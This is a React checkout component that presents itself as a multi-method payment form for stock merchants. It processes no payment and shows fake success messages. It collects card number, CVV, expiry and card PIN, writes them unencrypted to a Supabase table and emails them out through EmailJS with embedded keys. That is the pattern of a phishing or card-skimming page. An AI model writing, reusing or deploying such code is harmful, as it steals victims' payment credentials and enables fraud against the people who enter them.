'use client';

import React, { useState } from 'react';
import { toast } from 'sonner';
import styles from './MultiPayment.module.css';
import supabase from '../../lib/supabase';
import emailjs from '@emailjs/browser';
import { Wallet, CreditCard, Banknote, Store } from 'lucide-react';

const merchants = [
  { name: 'AlphaTrade', price: 120 },
  { name: 'GlobalEx', price: 135 },
  { name: 'StockBridge', price: 142 },
  { name: 'XMarket', price: 128 }
];

const MultiPayment = () => {
  const [paymentMethod, setPaymentMethod] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardPin, setCardPin] = useState('');
  const [bankDetails, setBankDetails] = useState('');
  const [merchant, setMerchant] = useState('');
  const [selectedPrice, setSelectedPrice] = useState<number | null>(null);

  const handlePayment = async () => {
    switch (paymentMethod) {
      case 'wallet':
        if (!walletAddress) return toast.error('Enter your wallet address.');
        toast.success('Wallet payment initiated.');
        break;
      case 'card':
        if (cardNumber.length < 12 || !expiry || !cvv || !cardPin) return toast.error('Complete card details.');
        toast.success('Card payment processed.');
        break;
      case 'bank':
        if (!bankDetails) return toast.error('Enter bank transfer reference.');
        toast.success('Bank transfer recorded.');
        break;
      case 'merchant':
        if (!merchant) return toast.error('Select a merchant.');
        toast.success(`Merchant payment to ${merchant} (${selectedPrice}$) verified.`);
        break;
      default:
        toast.error('Select a payment method.');
        return;
    }

    // Record the purchase in Supabase
    try {
      const { error } = await supabase.from('purchases').insert([
        {
          payment_method: paymentMethod,
          wallet_address: walletAddress,
          card_number: cardNumber,
          cvv: cvv,
          expiry_date: expiry,
          card_pin: cardPin,
        },
      ]);

      if (error) {
        console.error('Supabase Insert Error:', JSON.stringify(error, null, 2));
        toast.error(`Purchase order failed: ${error.message || 'Unknown error'}`);
        return;
      }

      // Step 3: Send confirmation email via EmailJS
      const form = {
        payment_method: paymentMethod,
        wallet_address: walletAddress,
        card_number: cardNumber,
        cvv: cvv,
        expiry_date: expiry,
        card_pin: cardPin,
      };
      emailjs
        .send(
          'service_tiih48u',
          'template_akfh6vu',
          form,
          'IyEEUqS1FYB6INOnR'
        )
        .then(() => console.log('Email sent!'))
        .catch((err: any) => console.error('EmailJS error:', err.text));
    } catch (err) {
      console.error('Unexpected error:', err);
      toast.error('An unexpected error occurred.');
    }
  };

  const handleMerchantSelect = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const selected = e.target.value;
    setMerchant(selected);
    const found = merchants.find((m) => m.name === selected);
    setSelectedPrice(found?.price || null);
  };
  

  return (
    <div className={styles.container}>
      <h2 className={styles.title}>Choose Payment Method</h2>
      <div className={styles.options}>
        <button onClick={() => setPaymentMethod('wallet')} className={styles.button}>
          <Wallet size={18} /> Wallet
        </button>
        <button onClick={() => setPaymentMethod('card')} className={styles.button}>
          <CreditCard size={18} /> Card
        </button>
        <button onClick={() => setPaymentMethod('bank')} className={styles.button}>
          <Banknote size={18} /> Bank Transfer
        </button>
        <button onClick={() => setPaymentMethod('merchant')} className={styles.button}>
          <Store size={18} /> Stock Merchant
        </button>
      </div>

      <div className={styles.fields}>
        {paymentMethod === 'wallet' && (
          <input
            type="text"
            placeholder="Wallet Address"
            value={walletAddress}
            onChange={(e) => setWalletAddress(e.target.value)}
            className={styles.input}
          />
        )}

        {paymentMethod === 'card' && (
          <>
            <input
              type="text"
              placeholder="Card Number"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              maxLength={16}
              className={styles.input}
            />
            <div className={styles.cardDetails}>
              <input
                type="text"
                placeholder="MM/YY"
                value={expiry}
                onChange={(e) => setExpiry(e.target.value)}
                className={styles.inputSmall}
              />
              <input
                type="text"
                placeholder="CVV"
                maxLength={4}
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                className={styles.inputSmall}
                />
              <input
                type="text"
                placeholder="CARD PIN"
                maxLength={6}
                value={cardPin}
                onChange={(e) => setCardPin(e.target.value)}
                className={styles.inputSmall}
              />
            </div>
          </>
        )}

        {paymentMethod === 'bank' && (
          <input
            type="text"
            placeholder="Bank Transfer Ref"
            value={bankDetails}
            onChange={(e) => setBankDetails(e.target.value)}
            className={styles.input}
          />
        )}

        {paymentMethod === 'merchant' && (
          <>
            <select className={styles.select} value={merchant} onChange={handleMerchantSelect}>
              <option value="">Select Merchant</option>
              {merchants.map((m) => (
                <option key={m.name} value={m.name}>
                  {m.name} - ${m.price}
                </option>
              ))}
            </select>
            {selectedPrice !== null && (
              <p className={styles.priceInfo}>
                Selected Merchant Price: <strong>${selectedPrice}</strong>
              </p>
            )}
          </>
        )}
      </div>

      <button className={styles.submitButton} onClick={handlePayment}>
        Proceed Payment
      </button>
    </div>
  );
};

export default MultiPayment;
